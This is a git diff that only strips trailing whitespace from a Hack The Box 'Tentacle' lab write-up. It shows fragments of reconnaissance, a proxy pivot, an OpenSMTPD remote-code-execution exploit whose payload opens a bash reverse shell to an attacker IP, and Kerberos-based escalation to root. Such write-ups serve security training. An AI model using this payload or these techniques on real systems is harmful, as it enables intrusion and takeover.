@@ -15,7 +15,7 @@ tags: [hackthebox, htb, boot2root, writeup, linux, tentacle, squid, squid proxy,
 
 ---
 
-:toc: 
+:toc:
 :toc-title: TABLE OF CONTENTS
 
 ---
@@ -26,7 +26,7 @@ ____
 [source,shell,subs="verbatim,quotes"]
 ----
 $ nmap --min-rate 3000 -oN nmap-tcp.initial -p- -Pn -T4 -v 10.10.10.224
-  
+
   PORT     STATE SERVICE
   22/tcp   open  ssh
   53/tcp   open  domain
@@ -37,12 +37,12 @@ $ nmap -oN nmap-tcp -p 22,53,88,3128 -Pn -sC -sV -v 10.10.10.224
 
   PORT     STATE SERVICE      VERSION
   22/tcp   open  ssh          OpenSSH 8.0 (protocol 2.0)
-  | ssh-hostkey: 
+  | ssh-hostkey:
   |   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)
   |   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)
   |_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)
   53/tcp   open  domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
-  | dns-nsid: 
+  | dns-nsid:
   |_  bind.version: 9.11.20-RedHat-9.11.20-5.el8
   88/tcp   open  kerberos-sec MIT Kerberos (server time: 2021-04-05 12:07:18Z)
   3128/tcp open  http-proxy   Squid http proxy 4.11
@@ -62,7 +62,7 @@ ____
 image::3128_landing_page.png[REALCORP.HTB]
 ____
 
-The cache administrator seems to be `*j.nakazawa@realcorp.htb*`  and the response page seems to have been generated from `*srv01.realcorp.htb*`. The following line could now be added to the `*/etc/hosts*` file: 
+The cache administrator seems to be `*j.nakazawa@realcorp.htb*`  and the response page seems to have been generated from `*srv01.realcorp.htb*`. The following line could now be added to the `*/etc/hosts*` file:
 ____
 [source,shell,subs="verbatim,quotes"]
 ----
@@ -72,11 +72,11 @@ ____
 
 === TCP PORT 53 : DNS
 
-Checking for interesting entries using `*dig*`: 
+Checking for interesting entries using `*dig*`:
 ____
 [source,shell,subs="verbatim,quotes"]
 ----
-$ dig realcorp.htb @10.10.10.224 ANY 
+$ dig realcorp.htb @10.10.10.224 ANY
 
   ; <<>> DiG 9.16.12-Debian <<>> realcorp.htb @10.10.10.224 ANY
   ;; global options: +cmd
@@ -101,7 +101,7 @@ $ dig realcorp.htb @10.10.10.224 ANY
   ;; SERVER: 10.10.10.224#53(10.10.10.224)
   ;; WHEN: Mon Apr 05 11:02:26 EDT 2021
   ;; MSG SIZE  rcvd: 143
-  
+
 ----
 ____
 
@@ -146,11 +146,11 @@ ____
 ----
 $ ssh -l j.nakazama 10.10.10.224
 
-  j.nakazama@10.10.10.224's password: 
+  j.nakazama@10.10.10.224's password:
   Permission denied, please try again.
-  j.nakazama@10.10.10.224's password: 
+  j.nakazama@10.10.10.224's password:
   Permission denied, please try again.
-  j.nakazama@10.10.10.224's password: 
+  j.nakazama@10.10.10.224's password:
   j.nakazama@10.10.10.224: Permission denied (gssapi-keyex,gssapi-with-mic,password).
 ----
 ____
@@ -161,7 +161,7 @@ GSSAPI Authentication seems to be supported on the machine and it is usually use
 
 === TCP PORT 88 : KERBEROS
 
-Setting up the *kerberos* configuration `*/etc/krb5.conf*`: 
+Setting up the *kerberos* configuration `*/etc/krb5.conf*`:
 ____
 [source,shell,subs="verbatim,quotes"]
 ----
@@ -193,7 +193,7 @@ $ kinit -V j.nakazawa
 
   Using default cache: /tmp/krb5cc_1000
   Using principal: j.nakazawa@REALCORP.HTB
-  Password for j.nakazawa@REALCORP.HTB: 
+  Password for j.nakazawa@REALCORP.HTB:
 
 ----
 ____
@@ -317,16 +317,16 @@ $ proxychains curl http://wpad.realcorp.htb/wpad.dat
     if (dnsDomainIs(host, "realcorp.htb"))
         return "DIRECT";
     if (isInNet(dnsResolve(host), "10.197.243.0", "255.255.255.0"))
-        return "DIRECT"; 
+        return "DIRECT";
     ##if (isInNet(dnsResolve(host), "10.241.251.0", "255.255.255.0"))##
-        return "DIRECT"; 
- 
+        return "DIRECT";
+
     return "PROXY proxy.realcorp.htb:3128";
   }
 ----
 ____
 
-This indicates that from `*proxy.realcorp.htb:3128*`, all connections within the IP ranges specified or from domains with `*realcorp.htb*` are passed through; however, with this, a new set of IPs are found -- *10.241.251.0/24*. And now running an nmap scan for that IP range: 
+This indicates that from `*proxy.realcorp.htb:3128*`, all connections within the IP ranges specified or from domains with `*realcorp.htb*` are passed through; however, with this, a new set of IPs are found -- *10.241.251.0/24*. And now running an nmap scan for that IP range:
 ____
 [source,shell,subs="verbatim,quotes"]
 ----
@@ -336,7 +336,7 @@ $ cat nmap-tcp_10.241.251.0_24| grep -B10 open | grep -E "Nmap|open|PORT"
 
   Nmap scan report for 10.241.251.1
   PORT     STATE  SERVICE
-  22/tcp   open   ssh 
+  22/tcp   open   ssh
   53/tcp   open   domain
   88/tcp   open   kerberos-sec
   3128/tcp open   squid-http
@@ -347,7 +347,7 @@ $ cat nmap-tcp_10.241.251.0_24| grep -B10 open | grep -E "Nmap|open|PORT"
 ----
 ____
 
-There seems to be open ports in `*10.241.251.1*` the same as the ones found from previous scans but this time, there is an open TCP port 25 (SMTP) on `*10.241.251.113` and doing a service scan using `*nmap*` reveals the following: 
+There seems to be open ports in `*10.241.251.1*` the same as the ones found from previous scans but this time, there is an open TCP port 25 (SMTP) on `*10.241.251.113` and doing a service scan using `*nmap*` reveals the following:
 ____
 [source,shell,subs="verbatim,quotes"]
 ----
@@ -355,8 +355,8 @@ $ proxychains nmap -p 25 -sC -sV -v 10.241.251.113
 
   PORT   STATE SERVICE VERSION
   25/tcp open  smtp    OpenSMTPD
-  | smtp-commands: smtp.realcorp.htb Hello nmap.scanme.org [10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, 
-  |_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info 
+  | smtp-commands: smtp.realcorp.htb Hello nmap.scanme.org [10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP,
+  |_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
   Service Info: Host: smtp.realcorp.htb
 ----
 ____
@@ -365,7 +365,7 @@ ____
 
 == PART 4 : EXPLOITATION
 
-An *OpenSMTPD 2.0.0* service seems to be running on `10.241.251.113` and upon searching for an existing, this came up -- 
+An *OpenSMTPD 2.0.0* service seems to be running on `10.241.251.113` and upon searching for an existing, this came up --
 link:https://blog.firosolutions.com/exploits/opensmtpd-remote-vulnerability/[Remote code execution in OpenSMTPD]. A few lines from the exploit were edited since it will not work right out the box:
 
 ____
@@ -391,7 +391,7 @@ payload = b"""\r\n
 #8\r\n
 #9\r\n
 #a\r\n
-#b\r\n 
+#b\r\n
 #c\r\n
 #d\r\n
 ##bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1'##
@@ -443,7 +443,7 @@ s.close()
 ----
 ____
 
-And upon running the exploit: 
+And upon running the exploit:
 ____
 [source,shell,subs="verbatim,quotes"]
 ----
@@ -461,7 +461,7 @@ $ proxychains python3 exploit.py
 ----
 ____
 
-A reverse shell started via *netcat* listener on port 443 was spawned: 
+A reverse shell started via *netcat* listener on port 443 was spawned:
 ____
 [source,shell,subs="verbatim,quotes"]
 ----
@@ -481,7 +481,7 @@ ____
 
 == PART 5 : GENERATING USER SHELL (j.nakazawa)
 
-Enumerating inside the reverse shell established from `*10.241.251.113*`: 
+Enumerating inside the reverse shell established from `*10.241.251.113*`:
 
 ____
 [source,shell,subs="verbatim,quotes"]
@@ -491,7 +491,7 @@ root@smtp:/# cat /etc/passwd | grep -E "sh$"
   root:x:0:0:root:/root:/bin/bash
   j.nakazawa:x:1000:1000::/home/j.nakazawa:/bin/bash
 
-root@smtp:/# cd /home/j.nakazawa  
+root@smtp:/# cd /home/j.nakazawa
 
 root@smtp:/home/j.nakazawa# ls -la
 
@@ -549,7 +549,7 @@ $ klist
 ----
 ____
 
-The authentication via *kerberos* succeeded and a ticket valid for 24 hours was generated. Using this to login via SSH, the `*/etc/hosts*` needs to be modified to give priority to `*srv01.realcorp.htb*`: 
+The authentication via *kerberos* succeeded and a ticket valid for 24 hours was generated. Using this to login via SSH, the `*/etc/hosts*` needs to be modified to give priority to `*srv01.realcorp.htb*`:
 
 ____
 [source,console,subs="verbatim,quotes"]
@@ -569,8 +569,8 @@ $ ssh -l j.nakazawa 10.10.10.224
   uid=1000(j.nakazawa) gid=1000(j.nakazawa) groups=1000(j.nakazawa),23(squid),100(users) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 
 [j.nakazawa@srv01 ~]$ hostname
-  
-  srv01.realcorp.htb 
+
+  srv01.realcorp.htb
 
 [j.nakazawa@srv01 ~]$ ls -l user.txt
 
@@ -578,7 +578,7 @@ $ ssh -l j.nakazawa 10.10.10.224
 ----
 ____
 
-The reason for this becomes apparent when `*klist*` is run again on the local machine: 
+The reason for this becomes apparent when `*klist*` is run again on the local machine:
 
 ____
 [source,shell,subs="verbatim,quotes"]
@@ -645,11 +645,11 @@ ____
 ----
 [j.nakazawa@srv01 ~]$ id
 
-  uid=1000(j.nakazawa) gid=1000(j.nakazawa) groups=1000(j.nakazawa),##23(squid)##,100(users) 
+  uid=1000(j.nakazawa) gid=1000(j.nakazawa) groups=1000(j.nakazawa),##23(squid)##,100(users)
   context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 
 [j.nakazawa@srv01 log]$ find / -gid 23 #-writable# 2>/dev/null
-  
+
   #/var/log/squid#
 ----
 ____
@@ -668,11 +668,11 @@ The reason for writing a `*.k5login*` file which will then be copied into the `*
 ____
 [source,shell,subs="verbatim,quotes"]
 ----
-$ ssh -l admin 10.10.10.224   
+$ ssh -l admin 10.10.10.224
 
 [admin@srv01 ~]$ id
 
-  uid=1011(admin) gid=1011(admin) groups=1011(admin),23(squid) 
+  uid=1011(admin) gid=1011(admin) groups=1011(admin),23(squid)
   context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 
 [admin@srv01 ~]$ hostname
@@ -692,7 +692,7 @@ ____
 ----
 [admin@srv01 ~]$ id
 
-  #uid=1011(admin)# gid=1011(admin) groups=1011(admin),23(squid) 
+  #uid=1011(admin)# gid=1011(admin) groups=1011(admin),23(squid)
   context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 
 [admin@srv01 ~]$ find / -gid 1011 #-readable# 2>/dev/null | grep -vE "^.proc|^.run|^.sys"
@@ -703,7 +703,7 @@ ____
   /home/admin/.ssh
 
 [admin@srv01 ~]$ file /etc/krb5.keytab
-  
+
   /etc/krb5.keytab: Kerberos Keytab file, realm=REALCORP.HTB, principal=host/srv01.realcorp.htb, type=1, date=Tue Dec  8 22:15:30 2020, kvno=2
 ----
 ____
@@ -763,17 +763,17 @@ ____
 [source,shell,subs="verbatim,quotes"]
 ----
 [admin@srv01 ~]$ ksu
-  
-  WARNING: Your password may be exposed if you enter it here and are logged 
-           in remotely using an unsecure (non-encrypted) channel. 
+
+  WARNING: Your password may be exposed if you enter it here and are logged
+           in remotely using an unsecure (non-encrypted) channel.
   Kerberos password for root@REALCORP.HTB: : ggwp
 
 [root@srv01 admin]# id
 
-  uid=0(root) gid=0(root) groups=0(root) 
+  uid=0(root) gid=0(root) groups=0(root)
   context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c102
 
-[root@srv01 admin]# ls -l /root/root.txt 
+[root@srv01 admin]# ls -l /root/root.txt
 
   -r--------. 1 root root 33 Apr  7 00:04 /root/root.txt
 
@@ -783,7 +783,7 @@ ____
       link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
       inet 127.0.0.1/8 scope host lo
          valid_lft forever preferred_lft forever
-      inet6 ::1/128 scope host 
+      inet6 ::1/128 scope host
          valid_lft forever preferred_lft forever
   2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
       link/ether 00:50:56:b9:d3:48 brd ff:ff:ff:ff:ff:ff
@@ -793,19 +793,19 @@ ____
          valid_lft forever preferred_lft forever
       inet 10.197.243.31/24 brd 10.197.243.255 scope global secondary noprefixroute ens192:1
          valid_lft forever preferred_lft forever
-      inet6 dead:beef::4627:8a70:2d81:989f/64 scope global dynamic noprefixroute 
+      inet6 dead:beef::4627:8a70:2d81:989f/64 scope global dynamic noprefixroute
          valid_lft 86368sec preferred_lft 14368sec
-      inet6 fe80::6588:7412:db10:612c/64 scope link noprefixroute 
+      inet6 fe80::6588:7412:db10:612c/64 scope link noprefixroute
          valid_lft forever preferred_lft forever
   3: cni-podman1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
       link/ether 0e:7e:1c:08:ed:d2 brd ff:ff:ff:ff:ff:ff
       inet 10.241.251.1/24 brd 10.241.251.255 scope global cni-podman1
          valid_lft forever preferred_lft forever
-      inet6 fe80::c7e:1cff:fe08:edd2/64 scope link 
+      inet6 fe80::c7e:1cff:fe08:edd2/64 scope link
          valid_lft forever preferred_lft forever
-  4: vethbc94cb18@if3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master cni-podman1 state UP group default 
+  4: vethbc94cb18@if3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master cni-podman1 state UP group default
       link/ether 82:ca:1b:ae:e7:18 brd ff:ff:ff:ff:ff:ff link-netns cni-4a7ef39c-a97e-11a6-433c-4dd8d53bd27b
-      inet6 fe80::80ca:1bff:feae:e718/64 scope link 
+      inet6 fe80::80ca:1bff:feae:e718/64 scope link
          valid_lft forever preferred_lft forever
 ----
 ____
